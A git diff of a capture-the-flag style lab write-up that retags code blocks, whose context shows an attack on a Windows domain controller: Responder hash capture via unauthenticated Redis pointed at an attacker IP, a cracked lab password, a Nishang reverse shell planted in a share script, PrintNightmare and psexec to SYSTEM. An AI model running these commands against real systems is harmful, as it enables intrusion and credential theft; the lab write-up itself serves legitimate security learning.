@@ -24,7 +24,7 @@ This lab features an attack vector starting from a **misconfigured NoSQL** datab
 
 The engagement begins with a comprehensive port scan to identify all available services:
 
-```Bash
+```zsh
 $ sudo nmap -sC -sV -v -Pn -p- 10.81.130.174
 ```
 
@@ -51,7 +51,7 @@ The host is identified as a **Domain Controller** based on the following:
 
 Initial enumeration using **enum4linux** and **kerbrute** confirms the domain name and identifies a valid administrative account:  
 
-```Bash
+```zsh
 $ enum4linux -a 10.81.130.174
 $ ./kerbrute_linux_amd64 userenum -d VULNNET.local --dc 10.81.130.174 users3.txt
 ```
@@ -68,13 +68,13 @@ Results:
 
 Port **6379 (Redis)** is an unusual find on a DC. Version 2.8.x is legacy and often lacks authentication.
 
-```Bash
+```zsh
 $ redis-cli -h 10.81.130.174 # Attempting unauthenticated access  
 ```
 
 Access is granted without a password. To escalate this, we use Responder to capture the **NTLMv2 hash** of the service account by forcing Redis to access a fake remote directory.
 
-```Bash
+```zsh
 $ sudo responder -I tun0 -dwv # Start Responder on the attacker machine
 > CONFIG SET dir \\192.168.144.226\fakefolder\ # Inside Redis CLI, trigger a connection to the attacker's IP
 ```
@@ -100,7 +100,7 @@ Using hashcat with the **rockyou.txt** wordlist:
 
 Using the recovered credentials, we re-scan the SMB shares:  
 
-```Bash
+```zsh
 $ enum4linux -u enterprise-security -p sand_0873959498 -a 10.81.130.174
 ```
 
@@ -118,12 +118,12 @@ rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 
 Since our user has write access to this share, we can replace the script with a **Nishang** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell:  
 
-```Bash
+```zsh
 # Append payload to the Nishang script:
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.226 -Port 4444
 ```
 
-```Bash
+```zsh
 $ smbclient //10.81.130.174/Enterprise-Share -U VULNNET.local/enterprise-security%sand_0873959498
 > put PurgeIrrelevantData_1826.ps1
 ```
@@ -158,7 +158,7 @@ We upload a **PrintNightmare** exploit (https://github.com/calebstewart/CVE-2021
 
 The exploit creates a **new local administrator**. We then use impacket-psexec to gain **SYSTEM** access:  
 
-```Bash
+```zsh
 $ impacket-psexec VULNNET.local/overmane:Passwd123@10.81.130.174
 ```
 
